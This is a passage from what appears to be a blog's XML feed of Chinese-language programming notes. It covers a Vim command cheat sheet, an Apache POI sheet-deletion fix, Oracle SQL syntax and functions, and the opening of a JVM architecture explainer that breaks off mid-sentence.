class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="Vim"><a href="#Vim" class="headerlink" title="Vim"></a>Vim</h2><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">quitting    :x - exit, saving changes    :wq - exit, saving changes    :q - exit, <span class="token keyword">if</span> no changes    :q<span class="token operator">!</span> - exit, ignore changesinserting text    i - insert before cursor    I - insert before line    a - append after cursor    A - append after line    o - <span class="token function">open</span> new line after cur line    O - <span class="token function">open</span> new line before cur line    r - replace one character    R - replace many charactersmotion    w - move to next word    W - move to next blank delimited word    b - move to beginning of the word    B - move to beginning of blank delimited word    e - move to end of word    E - move to end of blank delimited word    <span class="token punctuation">(</span> - move a sentence back    <span class="token punctuation">)</span> - move a sentence forward    <span class="token punctuation">{</span> - move paragraph back    <span class="token punctuation">}</span> - move paragraph forward    <span class="token number">0</span> - move to beginning of line    $ - move to end of line    nG - move to nth line of <span class="token function">file</span>    :n - move to nth line of <span class="token function">file</span>    G - move to last line of <span class="token function">file</span>    fc - move forward to <span class="token string">'c'</span>    Fc - move backward to <span class="token string">'c'</span>    H - move to <span class="token function">top</span> of <span class="token function">screen</span>    M - move to middle of <span class="token function">screen</span>    L - move to bottom of <span class="token function">screen</span>    % - move to associated <span class="token punctuation">(</span><span class="token punctuation">)</span>,<span class="token punctuation">{</span><span class="token punctuation">}</span>,<span class="token punctuation">[</span><span class="token punctuation">]</span>deleting text    x - delete character to the right    X - delete character to the left    D - delete to the end of line    <span class="token function">dd</span> - delete current line    :d - delete current linesearching    /string - search forward fo string    ?string - search back <span class="token keyword">for</span> string    n - search <span class="token keyword">for</span> next instance of string    N - search fo previous instance of stringreplace    :s/pattern/string/flags - replace pattern with string, according to flags    g - flag, replace all occurences    c - flag, confirm replaces    <span class="token operator">&amp;</span> - rpeat last :s <span class="token builtin class-name">command</span>files    :w <span class="token function">file</span> - <span class="token function">write</span> to <span class="token function">file</span>    :r <span class="token function">file</span> - <span class="token builtin class-name">read</span> <span class="token function">file</span> <span class="token keyword">in</span> after line    :n - go to next <span class="token function">file</span>    :p - go to previous <span class="token function">file</span>    :e <span class="token function">file</span> - deit <span class="token function">file</span>    <span class="token operator">!</span><span class="token operator">!</span>cmd - replace line with output of cmdother    u - undo last change    U - undo all changes to line<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>]]></content>
      
      
      <categories>
          
          <category> Linux </category>
          
      </categories>
      
      
        <tags>
            
            <tag> command </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>POI 删除表格的坑</title>
      <link href="/2017/09/12/poi-remove/"/>
      <url>/2017/09/12/poi-remove/</url>
      
        <content type="html"><![CDATA[<p>最近项目需求有个导出 excel 表格功能，因为之后可能会有导出 .xlsx 新版表格的需求，所以用了 Apache POI。下面说说我删除表格的时候遇到的坑= =</p><span id="more"></span><p>最开始我使用的是下面的代码，已知表格名字了，但是导出过程中这个表格中没有数据，所以需要把该表格删掉，所以就先获取名字，再根据名字删除表格。</p><pre class="line-numbers language-Java" data-language="Java"><code class="language-Java">String sheetName = sheet.getSheetName();workbook.removeName(sheetName);<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>但是运行的时候却出现了 <code>java.lang.ArrayIndexOutOfBoundsException</code> 问题。<br>调试进入源码发现 removeName(String) 方法都是根据 workbook 对象的 names 属性删除的…<br><img src="http://wx2.sinaimg.cn/mw690/a6e9cb00ly1fjgs8tsblfj20sm09kn5c.jpg" alt="源码"></p><p>而我的 workbook 对象 names 属性是 0。所以就出现了下标越界的问题。<br><img src="http://wx1.sinaimg.cn/mw690/a6e9cb00gy1fjgsc930vnj20p20gyq5p.jpg" alt="对象"></p><p>好吧，既然这样无法删除我就试试根据下标删除总行了吧！</p><pre class="line-numbers language-Java" data-language="Java"><code class="language-Java">String sheetName = sheet.getSheetName();int index = workbook.getSheetIndex(sheetName);workbook.removeSheet(index);<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>然而事实告诉我 removeName(int) 方法也是根据 names 属性删除的…所以同样报了上面的那个错误。</p><p>这时又发现了 removeSheetAt(int) 方法，就试了下，可算是根据 sheets 属性来删除了。。。<br>代码如下：</p><pre class="line-numbers language-Java" data-language="Java"><code class="language-Java">String sheetName = sheet.getSheetName();int index = workbook.getSheetIndex(sheetName);workbook.removeSheetAt(index);<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>总结：<br>Workbook 对象删除表格的两个方法 removeName(String) 和 removeName(int) 都是根据 names 属性删除的呃，貌似根本不是用来删除表格的。。。。<br>removeSheetAt(int) 才是删除表格。。。。</p>]]></content>
      
      
      <categories>
          
          <category> Java </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Excel </tag>
            
            <tag> POI </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Some Important Points for Oracle</title>
      <link href="/2017/08/18/oracleimportants/"/>
      <url>/2017/08/18/oracleimportants/</url>
      
        <content type="html"><![CDATA[<p>公司使用的是 oracle 数据库，还不太熟悉，所以整理一些 Oracle 数据库的要点，方便用到时查询。</p><ol><li><a href="">SQL 简介</a></li><li><a href="">SQL 操作服</a></li><li><a href="">Oracle 常用数据类型</a></li><li><a href="">Oracle 函数</a></li><li><a href="">Oracle 常用语法</a></li></ol><span id="more"></span><h2 id="SQL-简介"><a href="#SQL-简介" class="headerlink" title="SQL 简介"></a>SQL 简介</h2><p><strong>SQL（Structured Query Language，结构化查询语言）支持如下几个类别：</strong></p><ul><li><a href="">数据定义语言 (DDL)</a>：<font color="blue">CREATE</font>（创建）、<font color="blue">ALTER</font>（更改）、<font color="blue">TRUNCATE</font>（截断）、<font color="blue">DROP</font>（删除）命令。</li><li><a href="">数据操纵语言 (DML)</a>：<font color="blue">INSERT</font>（插入）、<font color="blue">SELECT</font>（选择）、<font color="blue">DELETE</font>（删除）、<font color="blue">UPDATE</font>（修改）命令。</li><li><a href="">事务控制语言</a>：<font color="blue">COMMIT</font>（提交）、<font color="blue">SAVEPOINT</font>（保存点）、ROLLBACK（回滚）命令。</li><li><a href="">数据控制语言</a>：<font color="blue">GRANT</font>（授予）、<font color="blue">REVOKE</font>（回收）命令。</li></ul><blockquote><p>特点</p></blockquote><ol><li>非过程语言，它同时可以访问多条记录。</li><li>所有关系型数据库的通用型语言，可移植性强。</li><li>对于数据和对象的操作简单。</li></ol><h3 id="数据定义语言"><a href="#数据定义语言" class="headerlink" title="数据定义语言"></a>数据定义语言</h3><p>用于改变数据库结构，包括创建、修改和删除数据库对象。</p><h4 id="1、CREATE-TABLE-创建表"><a href="#1、CREATE-TABLE-创建表" class="headerlink" title="1、CREATE TABLE 创建表"></a>1、CREATE TABLE 创建表</h4><p>创建表, 索引, 视图, 同义词, 过程, 函数, 数据库链接等</p><pre class="line-numbers language-SQL" data-language="SQL"><code class="language-SQL">CREATE TABLE [schema.]table(columname    datetype [, .]);<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><ul><li>表名的最大长度为 30 个字符；</li><li>表名首字母为字母，可以用下划线、数字和字母，但不能使用空格和单引号；</li><li>同一用户模式下的不同表不能有相同的名称；</li><li>表名、列名、用户名、和其他对象名不区分大小写，系统会自动转换成大写。</li></ul><p>ORACLE 常用的字段类型有<br>CHAR            固定长度的字符串<br>VARCHAR2        可变长度的字符串<br>NUMBER(M,N)        数字型 M 是位数总长度, N 是小数的长度<br>DATE            日期类型</p><p>创建表时要把较小的不为空的字段放在前面, 可能为空的字段放在后面</p><p>创建表时可以用中文的字段名, 但最好还是用英文的字段名</p><p>创建表时可以给字段加上默认值, 例如 DEFAULT SYSDATE<br>这样每次插入和修改时, 不用程序操作这个字段都能得到动作的时间</p><p>创建表时可以给字段加上约束条件<br>例如 不允许重复 UNIQUE, 关键字 PRIMARY KEY</p><h4 id="2、ALTER-TABLE-修改表"><a href="#2、ALTER-TABLE-修改表" class="headerlink" title="2、ALTER TABLE 修改表"></a>2、ALTER TABLE 修改表</h4><p>改变表, 索引, 视图等</p><pre class="line-numbers language-SLQ" data-language="SLQ"><code class="language-SLQ">ALTER TABLE &lt;tablename&gt;    MODIFY (column definition);    ADD (column definition);    DROP COLUMN column;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p>改变表的名称<br>ALTER TABLE 表名 1  TO 表名 2;</p><p>在表的后面增加一个字段<br>ALTER TABLE 表名 ADD 字段名 字段名描述;</p><p>修改表里字段的定义描述<br>ALTER TABLE 表名 MODIFY 字段名 字段名描述;</p><p>给表里的字段加上约束条件<br>ALTER TABLE 表名 ADD CONSTRAINT 约束名 PRIMARY KEY (字段名);<br>ALTER TABLE 表名 ADD CONSTRAINT 约束名 UNIQUE (字段名);</p><p>把表放在或取出数据库的内存区<br>ALTER TABLE 表名 CACHE;<br>ALTER TABLE 表名 NOCACHE;</p><h4 id="3、TRUNCATE-TABLE-截取表"><a href="#3、TRUNCATE-TABLE-截取表" class="headerlink" title="3、TRUNCATE TABLE 截取表"></a>3、TRUNCATE TABLE 截取表</h4><p>清空表里的所有记录, 保留表的结构</p><pre class="line-numbers language-SQL" data-language="SQL"><code class="language-SQL">TRUNCATE TABLE &lt;tablename&gt;；<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>快速删除记录并释放空间，不使用事务处理，无法回滚，效率高。</p><p>DESC <tablename>  查看表结构</tablename></p><h4 id="4、DROP-TABLE-删除表"><a href="#4、DROP-TABLE-删除表" class="headerlink" title="4、DROP TABLE 删除表"></a>4、DROP TABLE 删除表</h4><pre class="line-numbers language-SQL" data-language="SQL"><code class="language-SQL">DROP TABLE &lt;tablename&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>删除表和它所有的约束条件<br>DROP TABLE 表名 CASCADE CONSTRAINTS;</p><h3 id="数据操纵语言"><a href="#数据操纵语言" class="headerlink" title="数据操纵语言"></a>数据操纵语言</h3><h4 id="1-INSERT-往数据表里插入记录的语句"><a href="#1-INSERT-往数据表里插入记录的语句" class="headerlink" title="1.INSERT  (往数据表里插入记录的语句)"></a>1.INSERT  (往数据表里插入记录的语句)</h4><pre class="line-numbers language-SQL" data-language="SQL"><code class="language-SQL">INSERT INTO 表名(字段名 1, 字段名 2, ……) VALUES ( 值 1, 值 2, ……);INSERT INTO 表名(字段名 1, 字段名 2, ……)  SELECT 字段名 1, 字段名 2, …… FROM 另外的表名;````字符串类型的字段值必须用单引号括起来, 例如: ’GOOD DAY’如果字段值里包含单引号’ 需要进行字符串转换, 我们把它替换成两个单引号''. 字符串类型的字段值超过定义的长度会出错, 最好在插入前进行长度校验.日期字段的字段值可以用当前数据库的系统时间 SYSDATE, 精确到秒或者用字符串转换成日期型函数 TO_DATE(‘2001-08-01’,’YYYY-MM-DD’)TO_DATE()还有很多种日期格式, 可以参看 ORACLE DOC.年-月-日 小时:分钟:秒 的格式 YYYY-MM-DD HH24:MI:SSINSERT 时最大可操作的字符串长度小于等于 4000 个单字节, 如果要插入更长的字符串, 请考虑字段用 CLOB 类型,方法借用 ORACLE 里自带的 DBMS_LOB 程序包.INSERT 时如果要用到从 1 开始自动增长的序列号, 应该先建立一个序列号```SQLCREATE SEQUENCE 序列号的名称 (最好是表名+序列号标记) INCREMENT BY 1  START  WITH  1 MAXVALUE  99999  CYCLE  NOCACHE;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>其中最大的值按字段的长度来定, 如果定义的自动增长的序列号 NUMBER(6) , 最大值为 999999<br>INSERT 语句插入这个字段值为: 序列号的名称.NEXTVAL</p><hr><h4 id="2-DELETE-删除数据表里记录的语句"><a href="#2-DELETE-删除数据表里记录的语句" class="headerlink" title="2.DELETE  (删除数据表里记录的语句)"></a>2.DELETE  (删除数据表里记录的语句)</h4><pre class="line-numbers language-SQL" data-language="SQL"><code class="language-SQL">DELETE FROM 表名 WHERE 条件;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>注意：删除记录并不能释放 ORACLE 里被占用的数据块表空间. 它只把那些被删除的数据块标成 unused.</p><p>如果确实要删除一个大表里的全部记录, 可以用 TRUNCATE 命令, 它可以释放占用的数据块表空间<br>TRUNCATE TABLE 表名;<br>此操作不可回退.</p><hr><h4 id="3-UPDATE-修改数据表里记录的语句"><a href="#3-UPDATE-修改数据表里记录的语句" class="headerlink" title="3.UPDATE  (修改数据表里记录的语句)"></a>3.UPDATE  (修改数据表里记录的语句)</h4><pre class="line-numbers language-SQL" data-language="SQL"><code class="language-SQL">UPDATE 表名 SET 字段名 1=值 1, 字段名 2=值 2, …… WHERE 条件;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>如果修改的值 N 没有赋值或定义时, 将把原来的记录内容清为 NULL, 最好在修改前进行非空校验;<br>值 N 超过定义的长度会出错, 最好在插入前进行长度校验..</p><hr><p>注意事项:<br>A.    以上 SQL 语句对表都加上了行级锁,<br>    确认完成后, 必须加上事物处理结束的命令 COMMIT 才能正式生效,<br>    否则改变不一定写入数据库里.<br>    如果想撤回这些操作, 可以用命令 ROLLBACK 复原.</p><p>B.    在运行 INSERT, DELETE 和 UPDATE 语句前最好估算一下可能操作的记录范围,<br>    应该把它限定在较小 (一万条记录) 范围内,. 否则 ORACLE 处理这个事物用到很大的回退段.<br>    程序响应慢甚至失去响应. 如果记录数上十万以上这些操作, 可以把这些 SQL 语句分段分次完成,<br>    其间加上 COMMIT 确认事物处理.</p><p><font color="blue">DISTINCT</font> 防止选择重复的行</p><h3 id="事务控制语言"><a href="#事务控制语言" class="headerlink" title="事务控制语言"></a>事务控制语言</h3><p><font color="blue">COMMIT</font>  提交并结束事务处理。<br><font color="blue">SAVEPOINT</font>  保存点，将很长的事务处理划分为较小的部分，用于标记事务中可以应用回滚的点。<br><font color="blue">ROLLBACK</font>  用来撤销在当前的事务中已完成的操作。可以回滚整个事务处理；也可以将事务回滚到某个保存点。</p><pre class="line-numbers language-SQL" data-language="SQL"><code class="language-SQL">UPDATE xxx; SAVEPOINT mark1;DELETE FROM xxx; SAVEPOINT mark2; ROLLBACK TO SAVEPOINT mark1; COMMIT;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="数据控制语言"><a href="#数据控制语言" class="headerlink" title="数据控制语言"></a>数据控制语言</h3><p>为用户提供权限控制命令。</p><p><strong>授予对象权限:</strong></p><pre class="line-numbers language-SQL" data-language="SQL"><code class="language-SQL">GRANT SELECT,UPDATE  ON   order_master  TO MARTIN;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p><strong>取消对象权限</strong></p><pre class="line-numbers language-SQL" data-language="SQL"><code class="language-SQL">REVOKE SELECT,UPDATE  ON  order_master  FROM MARTIN;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><br>## SQL 操作符<h3 id="算术操作符"><a href="#算术操作符" class="headerlink" title="算术操作符"></a>算术操作符</h3><p>算术表达式有 NUMBER 数据类型的列名、数值常量和连接它们的算术操作符组成。（+ - * /）</p><h3 id="比较操作符"><a href="#比较操作符" class="headerlink" title="比较操作符"></a>比较操作符</h3><p>用于比较两个表达式的值。</p><ul><li>=、!=、&lt;、&gt;、&lt;=、&gt;=、BETWEEN……AND（检查是否在两个值之间）</li><li>[NOT] IN（与列表中的值匹配）</li><li>[NOT] LIKE（匹配字符模式，* _ 通配符）</li><li>[NOT] IS NULL（检查是否为空）</li></ul><h3 id="逻辑操作符"><a href="#逻辑操作符" class="headerlink" title="逻辑操作符"></a>逻辑操作符</h3><p>用于组合生成一个真或假的结果。AND OR NOT</p><h3 id="集合操作符"><a href="#集合操作符" class="headerlink" title="集合操作符"></a>集合操作符</h3><p>集合操作符将两个查询的结果组合成一个结果集合。</p><ul><li>UNION（联合）：返回两个查询选定不重复的行。(删除重复的行)</li><li>UNION ALL（联合所有）：合并两个查询选定的所有行，包括重复的行。</li><li>INTERSECT（交集）：只返回两个查询都有的行。</li><li>MINUS（减集）：在第一个查询结果中排除第二个查询结果中出现的行。（第一减第二）</li></ul><p>使用集合操作符连接起来的 SELECT 语句中的列应遵循以下规则：</p><ul><li>通过集合操作连接的各个查询相同列数，匹配列的数据类型；</li><li>这种查询不应含有 LONG 类型的列；</li><li>列标题来自第一个 SELECT 语句。</li></ul><pre class="line-numbers language-SQL" data-language="SQL"><code class="language-SQL">SELECT orderno FROM order_master  UNION SELECT orderno FROM order_detail;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><h3 id="连接操作符-（-）"><a href="#连接操作符-（-）" class="headerlink" title="连接操作符 （||）"></a>连接操作符 （||）</h3><p>用于将两个或者多个字符串合并成一个字符串，或者将一个字符串与一个数值合并在一起。</p><pre class="line-numbers language-SQL" data-language="SQL"><code class="language-SQL">SELECT ('供应商'|| venname || '的地址是' || venaddress)  FROM vendor_master<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><h2 id="Oracle-常用数据类型"><a href="#Oracle-常用数据类型" class="headerlink" title="Oracle 常用数据类型"></a>Oracle 常用数据类型</h2><h3 id="1、字符数据类型"><a href="#1、字符数据类型" class="headerlink" title="1、字符数据类型"></a>1、字符数据类型</h3><p>CHAR        固定长度字符串        长度 1～2000 个字节，未指定则默认为 1 字节<br>VARCHAR2    可变长度字符串        长度 1～4000 个字节，定义时必须指定大小<br>LONG        可变长度字符串        最多能存储 2GB，存储超过 VARCHAR2 的长文本信息<br>                    ps.一个表中只有一列为 LONG 数据类型，<br>                      .LONG 列不能建立索引，<br>                      .存储过程不能接受 LONG 数据类型的参数</p><h3 id="2、数值数据类型"><a href="#2、数值数据类型" class="headerlink" title="2、数值数据类型"></a>2、数值数据类型</h3><p>NUMBER 数据类型可以存储 正数、负数、零、定点数(不带小数点的？)和精度为 38 为的浮点数。<br>格式： NUMBER [(precision 精度，数字总位数 1～38 间<br>        , scale 范围，小数点右边的位数 -84～127 间)]</p><h3 id="3、时期时间数据类型"><a href="#3、时期时间数据类型" class="headerlink" title="3、时期时间数据类型"></a>3、时期时间数据类型</h3><p>DATE 数据类型，用于存储表中日期和时间数据。SYSDATE 函数功能就是返回当前的日期和时间。<br>TIMESTAMP 数据类型，存储时期、时间和时区信息。SYSTIMEATAMP 功能就是返回当前日期、时间和时区。</p><h3 id="4、二进制数据类型"><a href="#4、二进制数据类型" class="headerlink" title="4、二进制数据类型"></a>4、二进制数据类型</h3><p>RAW        二进制数据或字节串    长度 1～2000 字节，定义时应指定大小，可建索引<br>LONG RAW     可变长度的二进制数据    最大能存储 2GB，限制等同于 LONG 数据类型</p><h3 id="5、LOB-数据类型"><a href="#5、LOB-数据类型" class="headerlink" title="5、LOB 数据类型"></a>5、LOB 数据类型</h3><p>“大对象”数据类型，最多可存储多达 4GB 的信息。LOB 可以是外部的，也可以是内部的，取决于相对于数据库位置。<br>CLOB        Character LOB        存储大量的字符数据<br>BLOB        Binary LOB        存储大量的二进制对象（多媒体对象等）<br>BFILE        Binary FIle        能够将二进制文件存储在数据库外部的操作系统文件中<br>                    BFILE 存储一个 BFILE 定位器，它指向位于服务器文件系统上的二进制文件。<br>ps.一个表中可以有多个 LOB 列，每个 LOB 列可以是不同的 LOB 类型。</p><h3 id="6、伪列"><a href="#6、伪列" class="headerlink" title="6、伪列"></a>6、伪列</h3><p>Oracle 中的一个表列，但实际上未存储表中。可以从表中查询，但是不能插入，更新或者删除。</p><p>ROWID     返回行记录的行地址，通常情况下，ROWID 值可以唯一地标识数据库中的一行。<br>作用：    .能最快形式访问表中的一行。<br>    .能显示表中的行是如何存储的。<br>    .可以作为表中行的唯一标识。<br>例：SELECT ROWID, * FROM EMP  WHERE empno=’7900’;</p><p>ROWNUM    返回一个数值单表行的次序，第一行为 1，第二行为 2……<br>    通过使用 ROWNUM 用户可以限制查询返回的行数(或者分页？)<br>例：SELECT * FROM EMP WHERE ROWNUM &lt;= 10;</p><h2 id="Oracle-函数"><a href="#Oracle-函数" class="headerlink" title="Oracle 函数"></a>Oracle 函数</h2><pre><code>函数接受一个或多个参数并返回一个值。</code></pre><p>单行函数<br>    也称标量函数，对于从表中查询的每一行，该函数都返回一个值。<br>    单行函数出现在 SLEECT / WHERE 子句中。</p><h3 id="1、日期函数"><a href="#1、日期函数" class="headerlink" title="1、日期函数"></a>1、日期函数</h3><pre><code>对日期值进行运算，根据用途产生日期/数值类型的结果。</code></pre><p>ADD_MONTHS(d, n)    返回 指定日期加上月数后的 日期值<br>MONTHS_BETWEEN(d1, d2)    返回 两个日期间的 月数<br>LAST_DAY(d)        返回 指定日期当前的最后一天的 日期值<br>RONUD(d,[fmt])        返回 指定日期四舍五入格式(YEAR、MONTH、DAY)后的 日期值<br>NEXT_DAY(d,day)        返回 指定日期下一个星期几的 日期值<br>TRUNC(d,[fnt])        返回 指定日期截断为格式后的 日期值<br>EXTRACT(fmt FROM d)    返回 指定日期提取的格式的 值 </p><h3 id="2、字符函数"><a href="#2、字符函数" class="headerlink" title="2、字符函数"></a>2、字符函数</h3><pre><code>字符函数接受字符输入，并返回字符或数值。</code></pre><p>INITCAP(char)        首字母大写<br>LOWER(char)        转换为小写<br>UPPER(char)        转换为大写<br>LTRIM(char, set)    左裁切<br>RTRIM(char, set)    右裁切<br>TRANSLATE(char, from, to)        按字母翻译<br>REPLACE(char, search_str, replace_str)    字符串替换<br>INSTR(char, substr[,pos])        查找子串位置<br>SUBSTR(char, pos, len)            取子字符串<br>CONCAT(char1, char2)            连接字符串</p><p>CHR(ascii)        根据 ASCII 码返回对应字符串<br>LPAD / RPAD        左 / 右 填充<br>    LPAD (‘function’, 15 , ‘=’) 返回    ‘=======function’<br>TRAM            开头或结尾(或 开头和结尾)裁剪特定的字符，默认裁剪空格。<br>    TRIM ([LEADING | TRAILING] trim_char)<br>LENGTH(char)        返回字符串长度<br>DECODE            逐个值进行字符串替换<br>    DECODE (expr, search1, result1, search2, result2, [ ,default])<br>    DECODE (ostalus, ‘p’, ‘准备处理’, ‘c’, ‘已完成’)</p><h3 id="3、数字函数"><a href="#3、数字函数" class="headerlink" title="3、数字函数"></a>3、数字函数</h3><pre><code>数字函数接受数字输入并返回数值作为输出结果。</code></pre><p>ABS(n)        取绝对值<br>CEIL(n)        向上取值<br>FLOOR(n)    向下去整<br>SIN(n)        正弦值<br>COS(n)        余弦值<br>POWER(m, n)    指数函数<br>SQRT(n)        平方根<br>MOD(m, n)    取余<br>ROUND(m, n)    小数点后精度四舍五入<br>TRUNC(m, n)    小数点后精度截断</p><h3 id="4、转换函数"><a href="#4、转换函数" class="headerlink" title="4、转换函数"></a>4、转换函数</h3><pre><code>转换函数将一种数据类型转换为另一种数据类型。</code></pre><p>TO_CHAR (d|n, [,fmt])        格式化 日期 / 数值<br>TO_DATE (char [,fmt])        将 fmt 模型格式的字符串 转换为日期型<br>TO_NUMBER (char)        将 包含数字的的字符串转换为 数值型</p><h3 id="5、其他函数"><a href="#5、其他函数" class="headerlink" title="5、其他函数"></a>5、其他函数</h3><p>NVL (exp, exp2)        如果 exp 为空返回 exp2；如果非空返回 exp<br>NVL2 (exp, exp2, exp3)    如果 exp 为空返回 exp3；如果非空返回 exp2<br>NULLIF (exp1, exp2)    比较两表达式，相等返回空值，不等则返回 exp1</p><h3 id="分组函数-x2F-聚合函数"><a href="#分组函数-x2F-聚合函数" class="headerlink" title="分组函数 / 聚合函数"></a>分组函数 / 聚合函数</h3><pre><code>分组函数基于一组行返回结果，即为每一组行返回单个值。</code></pre><p>AVG (columname)         返回指定列的平均值<br>MAX (columname)         返回指定列的最大值<br>MIN (columname)         返回指定列的最小值<br>SUM (columname)         返回指定列的总值<br>COUNT<br>    COUNT (*)        统计所有行个数，包括重复行和空值得行<br>    COUNT (columname)    统计指定列非空值的个行数<br>    COUNT (DISTINCR columname)    统计指定列中 非重复，非空值得行个数    </p><p>GROUP BY 子句<br>    用于将信息表划分为组，对查询结果按组进行聚合运算，为每组返回一个结果。<br>HAVING 子句<br>    用来指定 GROUP BY 子句的检索条件。</p><h3 id="分析函数"><a href="#分析函数" class="headerlink" title="分析函数"></a>分析函数</h3><pre><code>分析函数根据一组行来计算聚合值。这些函数通常用来完成对聚集的累积排名、移动平均数和报表计算。分析函数与聚合函数不同的是他们为每组记录返回多个行。</code></pre><p>ROW_NUMBER () OVER ([PARTITION BY colum] ORDER BY colum)<br>    为有序组中的每一行返回一个唯一的排序值，序号由 ORDER BY 子句指定，从 1 开始，即使具有相等的值，排位也不同。<br>    PARTITION BY colum 按列值进行区分，各分组内在进行排序。</p><p>RANK () OVER ([PARTITION BY colum] ORDER BY colum)<br>    计算一个值在一个组中的地位，由 1 开头，具有相等值得行排位相同，序数随后跳跃相应的数值。</p><p>DENSE_RANK () OVER ([PARTITION BY colum] ORDER BY colum)<br>    计算一个值在一个组中的地位，由 1 开头，具有相等值得行排位相同，并且排位是连续的。</p><p>字符串函数<br>LENGTH()    字符长度<br>LENTTHB()    字节长度；一个汉字内存中占用 2 字节</p><p>LTRIM、RTRIM、TRIM</p><p>截串<br>SUBSTR(表达式，位置，长度)<br>Oracle 无左右取串函数，但可以使用变通方式完成。<br>左取串：    SUBSTR(‘abcdefg’, 1, 3)<br>右取串：    SUBSTR(‘abcedfg’, LENGTH(‘abcdefg’)-3+1, 3)</p><p>时间函数<br>sysdate、current_day<br>设置时间格式：    ALERT SESSION SET NLS_DATE_FORMAT = ‘dd-mon-yyyy HH:mi:ss’<br>求时间：        NEXT_DAY(sysdate, ‘星期三’)</p><p>转换函数<br>TO_CHAR(sysdate, ‘yyyy-mm-dd hh24:mi:ss’)<br>TO_DATE(‘12-3 月-04’)<br>TO_NUMBER(‘333’)        必须是能转换<br>TO_TIMESTAMP(‘2007-10-10 00:00:00.0’, ‘yyyy-mm-dd hh24:mi:ssxff’)    转换为时间戳格式</p><p>聚合函数<br>count(*)    ：查询表行数<br>count(column)    :查询列行数，会忽略空值，注意<br>ps.聚合函数不能做为 where 里查询条件出现（因为聚合是对所有查询结果的运算？）</p><p>其他函数<br>USER：当前用户<br>SUM(DECODE(SEX, ‘男’, 1, 0))    筛选出行被为男的记录 并加 1<br>SUM(DECODE(SEX, ‘女’, 1, 0))    筛选出行被为女的记录 并加 1<br>NVL(a2, ‘非输入’)        布尔值判断，利用系统对空值进行处理<br>SELECT DISTINCT a1 FROM aa    </p><p>表连接<br>内连接：查询时，把能够公共匹配的数据完全查询出来。<br>    FROM e, d WHERE e.id = d.id<br>    标准： FROM e JOIN d ON e.id = d.id</p><p>外连接：不完全匹配<br>  左连接：  FROM e JOIN d ON e.id = d.id(+)<br>    左边数据全部显示，右边匹配不上的部分用空值代替<br>  右连接：  FROM e JOIN d ON e.id(+) = d.id<br>    （同理左连接）</p><p>子查询<br>    无关子查询<br>    相关子查询</p><p>EXISTS()：    根据子查询返回是否存在数据来决定父查询。</p><p>UNION：        将多个查询出来的信息行整合成一个结果集。<br>  SELECT eid, ename FROM e<br>  UNION<br>  SELECT id, name FROM d<br>  ps.UNION 查询出来的重复记录不会显示，UNION ALL 则显示全部（包括重复的）。</p><p>INTERSECT:    返回查询出来信息行的交集，Oracle 独有。</p><p>利用查询结果批量更新：<br>  INSERT INTO e(eid, ename) SELECT id, name FROM d<br>或者利用查询结果创建新表：<br>  CREATE TABLE ttt AS ttt (SELECT * FROM e)</p>]]></content>
      
      
      <categories>
          
          <category> 数据库 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Oracle </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>JVM 工作原理</title>
      <link href="/2017/07/21/jvm/"/>
      <url>/2017/07/21/jvm/</url>
      
        <content type="html"><![CDATA[<p>Java 虚拟机（Java virtual machine，JVM）是运行 Java 程序必不可少的机制。JVM 实现了 Java 语言最重要的特征：即平台无关性。</p><p>因为编译后的 Java 程序指令并不直接在硬件系统的 CPU 上执行，而是由 JVM 执行。JVM 屏蔽了与具体平台相关的信息，使 Java 语言编译程序只需要生成在 JVM 上运行的目标字节码 <code>.class</code> 文件，就可以在多种平台上不加修改地运行。Java 虚拟机在执行字节码时，把字节码解释成具体平台上的机器指令执行。因此实现了 Java 平台无关性。它是 Java 程序能在多平台间进行无缝移植的可靠保证，同时也是 Java 程序的安全检验引擎（还进行安全检查）。</p><span id="more"></span><p>JVM 是编译后的 Java 程序（<code>.class</code> 文件）和硬件系统之间的接口。</p><blockquote><p>Java 程序通过 javac 进行编译，javac 是 JDK 中的 Java 语言编译器。<br>该工具可以将后缀为 <code>.java</code> 的源文件编译为后缀名为 <code>.class</code> 的可以运行于 Java 虚拟机的字节码文件。</p></blockquote><h2 id="JVM-体系架构"><a href="#JVM-体系架构" class="headerlink" title="JVM 体系架构"></a>JVM 体系架构</h2><p><img src="http://wx1.sinaimg.cn/mw690/a6e9cb00ly1fhrcybxrsbj20hc0b8tdf.jpg" alt="JVM 体系架构图"><br>JVM = 类加载器(Classloader) + 执行引擎(Execution Engine) + 